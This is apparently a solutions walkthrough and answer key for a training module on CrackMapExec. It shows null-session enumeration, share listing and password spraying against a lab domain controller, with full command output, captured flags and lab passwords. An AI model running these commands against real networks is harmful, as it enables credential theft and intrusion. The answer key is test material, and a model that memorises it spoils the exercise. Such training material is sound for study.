| Section | Question Number | Answer |
| --- | --- | --- |
| Targets and Protocols | Question 1 | \--ntds |
| Targets and Protocols | Question 2 | \--local-auth |
| Targets and Protocols | Question 3 | zerologon |
| Basic SMB Reconnaissance | Question 1 | DC01 |
| Basic SMB Reconnaissance | Question 2 | inlanefreight.htb |
| Basic SMB Reconnaissance | Question 3 | True |
| Basic SMB Reconnaissance | Question 4 | Windows 10.0 Build 17763 x64 |
| Exploiting NULL/Anonymous Sessions | Question 1 | carlos |
| Exploiting NULL/Anonymous Sessions | Question 2 | engels |
| Exploiting NULL/Anonymous Sessions | Question 3 | 41 days 23 hours 53 minutes |
| Exploiting NULL/Anonymous Sessions | Question 4 | linux01 |
| Password Spraying | Question 1 | Inlanefreight02! |
| Password Spraying | Question 2 | belkis |
| Password Spraying | Question 3 | nicole |
| Password Spraying | Question 4 | nicole |
| Finding ASREPRoastable Accounts | Question 1 | linda |
| Finding ASREPRoastable Accounts | Question 2 | Password123 |
| Searching for Accounts in Group Policy Objects | Question 1 | diana |
| Searching for Accounts in Group Policy Objects | Question 2 | HackingGPPlike4Pro |
| Searching for Accounts in Group Policy Objects | Question 3 | True |
| Working with Modules | Question 1 | WeLoveHacking |
| Working with Modules | Question 2 | 172.16.10.9 |
| MSSQL Enumeration and Attacks | Question 1 | engels |
| MSSQL Enumeration and Attacks | Question 2 | Looking@Dat4 |
| MSSQL Enumeration and Attacks | Question 3 | F1l3$\_UsinG\_MS$QL |
| Finding Kerberoastable Accounts | Question 1 | elieser |
| Finding Kerberoastable Accounts | Question 2 | Passw0rd |
| Finding Kerberoastable Accounts | Question 3 | linux01 |
| Spidering and Finding Juicy Information in an SMB Share | Question 1 | PCNames.txt |
| Spidering and Finding Juicy Information in an SMB Share | Question 2 | Creds.txt |
| Spidering and Finding Juicy Information in an SMB Share | Question 3 | Users |
| Spidering and Finding Juicy Information in an SMB Share | Question 4 | Password1 |
| Proxychains with CME | Question 1 | U$ing\_Pr0xyCh4ins\_&\_CME |
| Stealing Hashes | Question 1 | Password1 |
| Stealing Hashes | Question 2 | DONE |
| Stealing Hashes | Question 3 | R3l4y1nG\_Is\_Fun |
| Mapping and Enumeration with SMB | Question 1 | svc\_mssql |
| Mapping and Enumeration with SMB | Question 2 | linux01$ |
| Mapping and Enumeration with SMB | Question 3 | K |
| Mapping and Enumeration with SMB | Question 4 | 4000 |
| Mapping and Enumeration with SMB | Question 5 | 3103 |
| LDAP and RDP Enumeration | Question 1 | jorge |
| LDAP and RDP Enumeration | Question 2 | linux01 |
| LDAP and RDP Enumeration | Question 3 | svc\_gmsa$ |
| LDAP and RDP Enumeration | Question 4 | Us1nG\_S3rv1C3\_4Cco7nts\_H@$sh4S |
| Command Execution | Question 1 | N0\_M0r3\_FilT3r$ |
| Command Execution | Question 2 | False |
| Command Execution | Question 3 | R0bert\_G3tting\_4cc3S |
| Command Execution | Question 4 | K3y\_F1l3s\_EveryWh3r3 |
| Finding Secrets and Using Them | Question 1 | 6593d8c034bbe9db50e4ce94b1943701 |
| Finding Secrets and Using Them | Question 2 | harris |
| Finding Secrets and Using Them | Question 3 | 1bc3af33d22c1c2baec10a32db22c72d |
| Finding Secrets and Using Them | Question 4 | P4%$\_tH3\_hash\_with\_S0t1 |
| Popular Modules | Question 1 | 172.16.1.9 |
| Popular Modules | Question 2 | C:\\Users\\david\\AppData\\Roaming\\KeePass\\KeePass.config.xml |
| Popular Modules | Question 3 | S3creTSuperP@ssword |
| Vulnerability Scan Modules | Question 1 | N0w\_W3\_N33d\_Pr0x7Ch41n$ |
| Vulnerability Scan Modules | Question 2 | CME\_Vuln3rabil1tY\_$C4Nn3r |
| Skills Assessment | Question 1 | Password1 |
| Skills Assessment | Question 2 | R3Us3\_D4t@\_Fr0m\_DB |
| Skills Assessment | Question 3 | W3\_F1nD\_Cr3d$\_EverY\_Wh3re |
| Skills Assessment | Question 4 | Non\_D0m41n\_@dM1ns\_H@s\_Privs |
| Skills Assessment | Question 5 | CME\_R00cK$ |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Targets and Protocols

## Question 1

### "What is the name of the option to read the content of the NTDS.dit file?"

First, students need to install `Poetry` and `Rust` to allow for a flexible virtual environment while operating `CrackMapExec`:

Code: shell

```shell
curl -SSL https://install.python-poetry.org | python3 -
sudo apt-get update
sudo apt-get install -y libssl-dev libkrb5-dev libffi-dev python-dev build-essential
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs/ | sh
```

```
┌─[us-academy-1]─[10.10.14.133]─[htb-ac594497@htb-fgirv4pszo]─[~]
└──╼ [★]$ curl -SSL https://install.python-poetry.org | python3 -

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 28457  100 28457    0     0   817k      0 --:--:-- --:--:-- --:--:--  794k
Retrieving Poetry metadata

# Welcome to Poetry!

This will download and install the latest version of Poetry,
a dependency and package manager for Python.

It will add the \`poetry\` command to Poetry's bin directory, located at:

/home/htb-ac594497/.local/bin

You can uninstall at any time by executing this script with the --uninstall option,
and these changes will be reverted.

Installing Poetry (1.3.1): Done

Poetry (1.3.1) is installed now. Great!

You can test that everything is set up by executing:

\`poetry --version\`
┌─[us-academy-1]─[10.10.14.133]─[htb-ac594497@htb-fgirv4pszo]─[~]
└──╼ [★]$ sudo apt-get update

Get:1 https://repos.insights.digitalocean.com/apt/do-agent main InRelease [5,518 B]
Get:2 https://packages.microsoft.com/debian/10/prod buster InRelease [29.8 kB]                         
Get:3 https://debian.neo4j.com stable InRelease [44.2 kB]           
Get:4 https://deb.parrot.sh/parrot parrot InRelease [14.6 kB]
Get:5 https://deb.parrot.sh/direct/parrot parrot-security InRelease [14.4 kB]
Get:6 https://deb.parrot.sh/parrot parrot-backports InRelease [14.5 kB]
Err:1 https://repos.insights.digitalocean.com/apt/do-agent main InRelease
  The following signatures couldn't be verified because the public key is not available: NO_PUBKEY 77B79B3FFAF7EF65
<SNIP>
Fetched 19.6 MB in 2s (9,143 kB/s)                     
Reading package lists... Done
W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: https://repos.insights.digitalocean.com/apt/do-agent main InRelease: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY 77B79B3FFAF7EF65
W: Failed to fetch https://repos.insights.digitalocean.com/apt/do-agent/dists/main/InRelease  The following signatures couldn't be verified because the public key is not available: NO_PUBKEY 77B79B3FFAF7EF65
W: Some index files failed to download. They have been ignored, or old ones used instead.
┌─[us-academy-1]─[10.10.14.133]─[htb-ac594497@htb-fgirv4pszo]─[~]
└──╼ [★]$ sudo apt-get install -y libssl-dev libkrb5-dev libffi-dev python-dev build-essential

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Note, selecting 'python-dev-is-python2' instead of 'python-dev'
build-essential is already the newest version (12.9).
<SNIP>
Processing 1 added doc-base file...
Scanning application launchers
Removing duplicate launchers or broken launchers
Launchers are updated
┌─[us-academy-1]─[10.10.14.133]─[htb-ac594497@htb-fgirv4pszo]─[~]
└──╼ [★]$ curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs/ | sh

info: downloading installer
warning: it looks like you have an existing installation of Rust at:
warning: /usr/bin
warning: rustup should not be installed alongside Rust. Please uninstall your existing Rust first.
warning: Otherwise you may have confusion unless you are careful with your PATH
warning: If you are sure that you want both rustup and your already installed Rust
warning: then please reply \`y' or \`yes' or set RUSTUP_INIT_SKIP_PATH_CHECK to yes
warning: or pass \`-y' to ignore all ignorable checks.
error: cannot install while Rust is installed

Continue? (y/N) y

Welcome to Rust!

This will download and install the official compiler for the Rust
programming language, and its package manager, Cargo.

1) Proceed with installation (default)
2) Customize installation
3) Cancel installation
>1

info: installing component 'clippy'
info: installing component 'rust-docs'
 19.0 MiB /  19.0 MiB (100 %)   4.8 MiB/s in  3s ETA:  0s
info: installing component 'rust-std'
 29.7 MiB /  29.7 MiB (100 %)   8.8 MiB/s in  3s ETA:  0s
info: installing component 'rustc'
 68.0 MiB /  68.0 MiB (100 %)  10.3 MiB/s in  6s ETA:  0s
info: installing component 'rustfmt'
info: default toolchain set to 'stable-x86_64-unknown-linux-gnu'

  stable-x86_64-unknown-linux-gnu installed - rustc 1.66.0 (69f9c33d7 2022-12-12)

Rust is installed now. Great!

To get started you may need to restart your current shell.
This would reload your PATH environment variable to include
Cargo's bin directory ($HOME/.cargo/bin).

To configure your current shell, run:
source "$HOME/.cargo/env"
```

Something very important to note here is that students must close the terminal and re open it to avoid errors with the `aardwolf` RDP library. Once the terminal is closed and re opened, students need to proceed with the following steps to complete the installation:

Code: shell

```shell
git clone https://github.com/Porchetta-Industries/CrackMapExec
cd CrackMapExec/
poetry install
```

```
┌─[us-academy-1]─[10.10.14.133]─[htb-ac594497@htb-fgirv4pszo]─[~]
└──╼ [★]$ git clone https://github.com/Porchetta-Industries/CrackMapExec

Cloning into 'CrackMapExec'...
remote: Enumerating objects: 6067, done.
remote: Counting objects: 100% (489/489), done.
remote: Compressing objects: 100% (191/191), done.
remote: Total 6067 (delta 342), reused 410 (delta 297), pack-reused 5578
Receiving objects: 100% (6067/6067), 8.42 MiB | 1.26 MiB/s, done.
Resolving deltas: 100% (4236/4236), done.

┌─[us-academy-1]─[10.10.14.133]─[htb-ac594497@htb-fgirv4pszo]─[~]
└──╼ [★]$ cd CrackMapExec/

┌─[us-academy-1]─[10.10.14.133]─[htb-ac594497@htb-fgirv4pszo]─[~/CrackMapExec]
└──╼ [★]$ poetry install

<SNIP>

  • Installing aioconsole (0.3.3)
  • Installing black (20.8b1)
  • Installing flake8 (5.0.4)
  • Installing lsassy (3.1.3)
  • Installing masky (0.1.1)
  • Installing msgpack (1.0.4)
  • Installing neo4j (4.4.9)
  • Installing paramiko (2.12.0)
  • Installing pylint (2.13.9)
  • Installing pylnk3 (0.4.2)
  • Installing pypsrp (0.7.0)
  • Installing pywerview (0.3.3)
  • Installing shiv (1.0.3)
  • Installing termcolor (1.1.0)
  • Installing terminaltables (3.1.10)
  • Installing xmltodict (0.12.0)
  
Installing the current project: crackmapexec (5.4.1)
```

Finally, students need to issue the command:

Code: shell

```shell
poetry run crackmapexec
```

```
┌─[us-academy-1]─[10.10.14.133]─[htb-ac594497@htb-hequuxcyqr]─[~/CrackMapExec]
└──╼ [★]$ poetry run crackmapexec

[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing FTP protocol database
[*] Initializing LDAP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing RDP protocol database
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
[*] Initializing WINRM protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--darrell] [--verbose]

                    {ftp,ldap,mssql,rdp,smb,ssh,winrm} ...

      ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______
     /      ||   _  \         /   \      /      ||  |/  / |   \/   |     /   \     |   _  \  |   ____|\  \ /  / |   ____| /      |
    |  ,----'|  |_)  |       /  ^  \    |  ,----'|  '  /  |  \  /  |    /  ^  \    |  |_)  | |  |__    \  V  /  |  |__   |  ,----'
    |  |     |      /       /  /_\  \   |  |     |    <   |  |\/|  |   /  /_\  \   |   ___/  |   __|    >   <   |   __|  |  |
    |  \`----.|  |\  \----. /  _____  \  |  \`----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  \`----.
     \______|| _| \`._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|

                                                A swiss army knife for pentesting networks
                                    Forged by @byt3bl33d3r and @mpgn_x64 using the powah of dank memes

                                           Exclusive release for Porchetta Industries users
                                                       https://porchetta.industries/

                                                   Version : 5.4.1
                                                   Codename: Indestructible G0thm0g

optional arguments:
  -h, --help            show this help message and exit
  -t THREADS            set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)
  --jitter INTERVAL     sets a random delay between each connection (default: None)
  --darrell             give Darrell a hand
  --verbose             enable verbose output

protocols:
  available protocols

  {ftp,ldap,mssql,rdp,smb,ssh,winrm}
    ftp                 own stuff using FTP
    ldap                own stuff using LDAP
    mssql               own stuff using MSSQL
    rdp                 own stuff using RDP
    smb                 own stuff using SMB
    ssh                 own stuff using SSH
    winrm               own stuff using WINRM
```

Therefore, since students are still inside the directory of the cloned repo, they are to invoke a `poetry shell`:

Code: shell

```shell
poetry shell
```

```
┌─[us-academy-1]─[10.10.14.133]─[htb-ac594497@htb-hequuxcyqr]─[~/CrackMapExec]
└──╼ [★]$ poetry shell

Spawning shell within /home/htb-ac594497/.cache/pypoetry/virtualenvs/crackmapexec-DaeN4F2F-py3.9

┌─[us-academy-1]─[10.10.14.133]─[htb-ac594497@htb-hequuxcyqr]─[~/CrackMapExec]
└──╼ [★]$ . /home/htb-ac594497/.cache/pypoetry/virtualenvs/crackmapexec-DaeN4F2F-py3.9/bin/activate

(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.133]─[htb-ac594497@htb-hequuxcyqr]─[~/CrackMapExec]
└──╼ [★]$ 
```

From this point forward, students will be using the crackmapexec tool while operating out of the Poetry Shell. This is to ensure that the virtual environment and all of it's software libraries are fully compatible and the tool will run smooth for the remainder of the Module.

For the first question, students need to look at the SMB help options for `CrackMapExec`:

Code: shell

```shell
crackmapexec smb --help
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.133]─[htb-ac594497@htb-hequuxcyqr]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb --help

usage: crackmapexec smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-k]
                        [--use-kcache] [--export EXPORT [EXPORT ...]] [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST]
                        [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT] [-M MODULE]
                        [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options] [--server {http,https}] [--server-host HOST]
                        [--server-port PORT] [--connectback-host CHOST] [-H HASH [HASH ...]] [--no-bruteforce]
                        [-d DOMAIN | --local-auth] [--port {139,445}] [--share SHARE] [--smb-server-port SMB_SERVER_PORT]
                        [--gen-relay-list OUTPUT_FILE] [--continue-on-success] [--smb-timeout SMB_TIMEOUT] [--laps [LAPS]]
                        [--sam | --lsa | --ntds [{drsuapi,vss}]] [--enabled] [--user USERNTDS] [--shares] [--sessions]
                        [--disks] [--loggedon-users-filter LOGGEDON_USERS_FILTER] [--loggedon-users] [--users [USER]]
                        [--groups [GROUP]] [--computers [COMPUTER]] [--local-groups [GROUP]] [--pass-pol]
                        [--rid-brute [MAX_RID]] [--wmi QUERY] [--wmi-namespace NAMESPACE] [--spider SHARE]
                        [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST] [--pattern PATTERN [PATTERN ...] |
                        --regex REGEX [REGEX ...]] [--depth DEPTH] [--only-files] [--put-file FILE FILE]
                        [--get-file FILE FILE] [--exec-method {wmiexec,mmcexec,atexec,smbexec}] [--codec CODEC]
                        [--force-ps32] [--no-output] [-x COMMAND | -X PS_COMMAND] [--obfs] [--amsi-bypass FILE]
                        [--clear-obfscripts]
                        [target ...]

<SNIP>

 --ntds [{vss,drsuapi}]
                        dump the NTDS.dit from target DCs using the specifed
                        method (default: drsuapi)
```

Students will see from the output that the `--ntds` option will dump the NTDS.dit database from a target domain controller.

Answer: `--ntds`

# Targets and Protocols

## Question 2

### "What is the name of the option to authenticate locally to a target?"

Students need to look at the SMB help options:

Code: shell

```shell
crackmapexec smb --help
```

\`\`

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.133]─[htb-ac594497@htb-hequuxcyqr]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb --help

<SNIP>

  --local-auth          authenticate locally to each target
```

Answer: `--local-auth`

# Targets and Protocols

## Question 3

### "What's the full name of the smb module that starts with zero?"

Students need to run the following command to list SMB modules:

Code: shell

```shell
crackmapexec smb -L
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.133]─[htb-ac594497@htb-hequuxcyqr]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb -L

<SNIP>

[*] zerologon                 Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472
```

After listing all the available modules, students will see `ZeroLogon` at the bottom of the output.

Answer: `ZeroLogon`

# Basic SMB Reconnaissance

## Question 1

### "What's the name of the target machine?"

Students need to run crackmapexec, specifying SMB protocol along with the target IP:

Code: shell

```shell
crackmapexec smb STMIP
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.133]─[htb-ac594497@htb-hequuxcyqr]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.177

SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
```

The name is shown to be `DC01`.

Answer: `DC01`

# Basic SMB Reconnaissance

## Question 2

### "What's the domain name of the target machine?"

Students need to run `CrackMapExec`, specifying SMB protocol along with the target IP:

Code: shell

```shell
crackmapexec smb STMIP
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.133]─[htb-ac594497@htb-hequuxcyqr]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.177

SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
```

The domain is shown to be `inlanefreight.htb`.

Answer: `inlanefreight.htb`

# Basic SMB Reconnaissance

## Question 3

### "Is SMB signing False or True?"

Students need to run `CrackMapExec`, specifying the SMB protocol along with the target IP:

Code: shell

```shell
crackmapexec smb STMIP
```

```
(\`CrackMapExec\`-py3.9) ┌─[us-academy-1]─[10.10.14.133]─[htb-ac594497@htb-hequuxcyqr]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.177

SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
```

It is shown that signing is set to `True`.

Answer: `True`

# Basic SMB Reconnaissance

## Question 4

### "What's the OS version?"

Students need to run `CrackMapExec`, specifying SMB protocol along with the target IP:

```
crackmapexec smb STMIP
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.133]─[htb-ac594497@htb-hequuxcyqr]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.177

SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
```

The OS version is shown to be `Windows 10.0 Build 17763 x64`.

Answer: `Windows 10.0 Build 17763 x64`

# Exploiting NULL/Anonymous Sessions

## Question 1

### "What's the account name that start with car?"

Students need to take advantage of a NULL smb session to dump user accounts:

Code: shell

```shell
crackmapexec smb STMIP -u '' -p '' --users
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.133]─[htb-ac594497@htb-hequuxcyqr]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.177 -u '' -p '' --users

SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\: 
SMB         10.129.204.177  445    DC01             [-] Error enumerating domain users using dc ip 10.129.204.177: NTLM needs domain\username and a password
SMB         10.129.204.177  445    DC01             [*] Trying with SAMRPC protocol
SMB         10.129.204.177  445    DC01             [+] Enumerated domain user(s)
SMB         10.129.204.177  445    DC01             inlanefreight.htb\Guest                          Built-in account for guest access to the computer/domain
SMB         10.129.204.177  445    DC01             inlanefreight.htb\carlos                         
SMB         10.129.204.177  445    DC01             inlanefreight.htb\grace                          
SMB         10.129.204.177  445    DC01             inlanefreight.htb\peter                          
SMB         10.129.204.177  445    DC01             inlanefreight.htb\alina                          Account for testing HR App. Password: HRApp123!
SMB         10.129.204.177  445    DC01             inlanefreight.htb\noemi                          
SMB         10.129.204.177  445    DC01             inlanefreight.htb\engels                         Service Account for testing
SMB         10.129.204.177  445    DC01             inlanefreight.htb\kiosko                         
SMB         10.129.204.177  445    DC01             inlanefreight.htb\testaccount                    pwd: Testing123!
SMB         10.129.204.177  445    DC01             inlanefreight.htb\mathew                         
SMB         10.129.204.177  445    DC01             inlanefreight.htb\svc_mssql                      
SMB         10.129.204.177  445    DC01             inlanefreight.htb\gmsa_adm                       
SMB         10.129.204.177  445    DC01             inlanefreight.htb\belkis                         
SMB         10.129.204.177  445    DC01             inlanefreight.htb\nicole                         
SMB         10.129.204.177  445    DC01             inlanefreight.htb\jorge                          
SMB         10.129.204.177  445    DC01             inlanefreight.htb\linda                          
SMB         10.129.204.177  445    DC01             inlanefreight.htb\shaun                          
SMB         10.129.204.177  445    DC01             inlanefreight.htb\diana                          Secret word WeLoveHacking
SMB         10.129.204.177  445    DC01             inlanefreight.htb\patrick                        
SMB         10.129.204.177  445    DC01             inlanefreight.htb\elieser                        
```

The account name that starts with 'car' is shown to be `carlos`.

Answer: `carlos`

# Exploiting NULL/Anonymous Sessions

## Question 2

### "What's the account name with the description "Service Account for testing"?"

Students need to use a NULL session to dump user accounts:

Code: shell

```shell
crackmapexec smb STMIP -u '' -p '' --users
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.124]─[htb-ac594497@htb-lzmuybfhwu]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.177 -u '' -p '' --users

<SNIP>

SMB         10.129.204.177  445    DC01             inlanefreight.htb\engels                         Service Account for testing
```

Students will find the account named `engels` matches the description.

Answer: `engels`

# Exploiting NULL/Anonymous Sessions

## Question 3

### "Including days, hours and minutes, what is the maximum password age?"

Students need to use a NULL session along with the option to enumerate password policy:

Code: shell

```shell
crackmapexec smb STMIP -u '' -p '' --pass-pol
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.124]─[htb-ac594497@htb-lzmuybfhwu]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.177 -u '' -p '' --pass-pol

<SNIP>

SMB         10.129.204.177  445    DC01             Maximum password age: 41 days 23 hours 53 minutes 
```

The maximum password age is shown to be `41 days 23 hours 53 minutes`.

Answer: `41 days 23 hours 53 minutes`

# Exploiting NULL/Anonymous Sessions

## Question 4

### "Which shared folder do we have READ and WRITE privileges?"

Students need to attack SMB, authenticating as `guest` with an empty password along with the option to list shares:

Code: shell

```shell
crackmapexec smb 10.129.204.177 -u guest -p '' --shares
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.124]─[htb-ac594497@htb-lzmuybfhwu]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.177 -u guest -p '' --shares

<SNIP>

SMB         10.129.204.177  445    DC01             linux01         READ,WRITE
```

The share with available read/write permissions is shown to be `linux01`.

Answer: `linux01`

# Password Spraying

## Question 1

### "What's the password for the user nicole?"

Students must first create a list of users by utilizing NULL authentication, exporting to a `users.txt` file:

Code: shell

```shell
crackmapexec smb 10.129.204.177  -u '' -p '' --users --export $(pwd)/users.txt
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.124]─[htb-ac594497@htb-lzmuybfhwu]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.177  -u '' -p '' --users --export $(pwd)/users.txt

SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\: 
SMB         10.129.204.177  445    DC01             [-] Error enumerating domain users using dc ip 10.129.204.177: NTLM needs domain\username and a password
SMB         10.129.204.177  445    DC01             [*] Trying with SAMRPC protocol
SMB         10.129.204.177  445    DC01             [+] Enumerated domain user(s)
SMB         10.129.204.177  445    DC01             inlanefreight.htb\Guest                          Built-in account for guest access to the computer/domain
SMB         10.129.204.177  445    DC01             inlanefreight.htb\carlos                         
SMB         10.129.204.177  445    DC01             inlanefreight.htb\grace                          
SMB         10.129.204.177  445    DC01             inlanefreight.htb\peter                          
SMB         10.129.204.177  445    DC01             inlanefreight.htb\alina                          Account for testing HR App. Password: HRApp123!
SMB         10.129.204.177  445    DC01             inlanefreight.htb\noemi                          
SMB         10.129.204.177  445    DC01             inlanefreight.htb\engels                         Service Account for testing
SMB         10.129.204.177  445    DC01             inlanefreight.htb\kiosko                         
SMB         10.129.204.177  445    DC01             inlanefreight.htb\testaccount                    pwd: Testing123!
SMB         10.129.204.177  445    DC01             inlanefreight.htb\mathew                         
SMB         10.129.204.177  445    DC01             inlanefreight.htb\svc_mssql                      
SMB         10.129.204.177  445    DC01             inlanefreight.htb\gmsa_adm                       
SMB         10.129.204.177  445    DC01             inlanefreight.htb\belkis                         
SMB         10.129.204.177  445    DC01             inlanefreight.htb\nicole                         
SMB         10.129.204.177  445    DC01             inlanefreight.htb\jorge                          
SMB         10.129.204.177  445    DC01             inlanefreight.htb\linda                          
SMB         10.129.204.177  445    DC01             inlanefreight.htb\shaun                          
SMB         10.129.204.177  445    DC01             inlanefreight.htb\diana                          Secret word WeLoveHacking
SMB         10.129.204.177  445    DC01             inlanefreight.htb\patrick                        
SMB         10.129.204.177  445    DC01             inlanefreight.htb\elieser                        
```

The list of usernames needs to be formatted:

Code: shell

```shell
sed -i "s/'/\"/g" users.txt
jq -r '.[]' users.txt > userslist.txt
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.124]─[htb-ac594497@htb-lzmuybfhwu]─[~/CrackMapExec]
└──╼ [★]$ sed -i "s/'/\"/g" users.txt

(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.124]─[htb-ac594497@htb-lzmuybfhwu]─[~/CrackMapExec]
└──╼ [★]$ jq -r '.[]' users.txt > userslist.txt

(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.124]─[htb-ac594497@htb-lzmuybfhwu]─[~/CrackMapExec]
└──╼ [★]$ cat userslist.txt 

Guest
carlos
grace
peter
alina
noemi
engels
kiosko
testaccount
mathew
svc_mssql
gmsa_adm
belkis
nicole
jorge
linda
shaun
diana
patrick
elieser
```

Next, a list of passwords must be created:

Code: shell

```shell
echo 'Inlanefreight01!' > passwords.txt && echo 'Inlanefreight02!' >> passwords.txt && echo 'Inlanefreight03!' >> passwords.txt
```

Students need to perform a password spray with the `--continue-on-success` option:

Code: shell

```shell
crackmapexec smb STMIP -u userslist.txt -p passwords.txt --continue-on-success
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.124]─[htb-ac594497@htb-lzmuybfhwu]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.177 -u userslist.txt -p passwords.txt --continue-on-success

SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\Guest:Inlanefreight01! STATUS_LOGON_FAILURE 
inlanefreight.htb\nicole:Inlanefreight01! STATUS_LOGON_FAILURE 
SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\nicole:Inlanefreight02! 
SMB         10.129.204.177  445    DC01             [-] 
```

The password for `nicole` is shown to be `Inlanefreight02!`.

Answer: `Inlanefreight02!`

# Password Spraying

## Question 2

### "Which other account has the STATUS\_PASSWORD\_MUST\_CHANGE flag?"

Students need use the wordlists from the previous section, running the same command:

Code: shell

```shell
crackmapexec smb 10.129.204.177 -u userslist.txt -p passwords.txt --continue-on-success
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.124]─[htb-ac594497@htb-lzmuybfhwu]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.177 -u userslist.txt -p passwords.txt --continue-on-success

<SNIP>

SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\belkis:Inlanefreight02! STATUS_PASSWORD_MUST_CHANGE
```

The user with the STATUS\_PASSWORD\_MUST\_CHANGE flag is shown to be `belkis`.

Answer: `belkis`

# Password Spraying

## Question 3

### "Which user other than peter can also connect via WinRM?"

Students need to make a list of all users whose passwords have been identified:

```
carlos:Inlanefreight02!
grace:Inlanefreight01!
nicole:Inlanefreight02!
```

And place them into two separate wordlists. One containing the found users, and the other containing the corresponding password:

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.124]─[htb-ac594497@htb-sf54d23omb]─[~/CrackMapExec]
└──╼ [★]$ cat usersfound.txt; cat passfound.txt 

carlos
grace
nicole
Inlanefreight02!
Inlanefreight01!
Inlanefreight02!
```

Then, students need to use `CrackMapExec`, specifying `--no-bruteforce` and also to `--continue-on-success`:

Code: shell

```shell
crackmapexec winrm STMIP -u usersfound.txt -p passfound.txt --no-bruteforce --continue-on-success
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.124]─[htb-ac594497@htb-sf54d23omb]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec winrm 10.129.204.177 -u usersfound.txt -p passfound.txt --no-bruteforce --continue-on-success

